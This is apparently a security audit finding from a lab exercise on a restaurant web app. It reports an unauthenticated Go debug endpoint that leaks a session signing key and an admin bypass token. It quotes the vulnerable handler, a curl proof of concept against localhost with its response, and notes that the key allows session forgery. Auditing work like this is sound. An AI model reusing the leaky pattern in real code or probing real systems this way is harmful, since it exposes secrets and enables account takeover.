# C4 — Security Misconfiguration: `/api/debug/info` (V09)

**Severity:** Critical  
**CWE:** CWE-489 | **OWASP:** A05:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-009-v09-debug-info-dump.md`

## Summary

The `/api/debug/info` endpoint is unauthenticated, has no environment check, and returns the `session_key` (HMAC key for cookie integrity) and `admin_token` (admin bypass constant) in plaintext. The endpoint exists in all environments including `APP_ENV=production`.

## Vulnerable Code

`handlers/admin.go::DebugInfo`:

```go
func DebugInfo(w http.ResponseWriter, r *http.Request) {
    // no auth check
    // ...
    json.NewEncoder(w).Encode(map[string]interface{}{
        "session_key": config.Get().SessionKey,   // LEAK
        "admin_token": config.LabAdminToken,      // LEAK
        // + DB path, runtime stats, table counts
    })
}
```

## Impact

- **Direct chain with V07:** `admin_token` value obtained → admin routes accessed.
- **Session forgery:** `session_key` allows forging gorilla/securecookie sessions for any user.
- No environment check: leaks even when `APP_ENV=production`.

## PoC

```bash
curl http://localhost:4443/api/debug/info
```

Response:
```json
{
  "admin_token": "lab-admin-bypass-token",
  "session_key": "lab-session-key-change-me",
  "db_path": "./restaurant.db",
  "version": "1.7.0",
  "environment": "lab",
  "users": 5, "orders": 10, "menu_items": 10, ...
}
```

## Cold Verification

Re-read source: confirmed no auth, no env check, leaks both keys in plaintext. Reachable on public `:4443` without authentication.
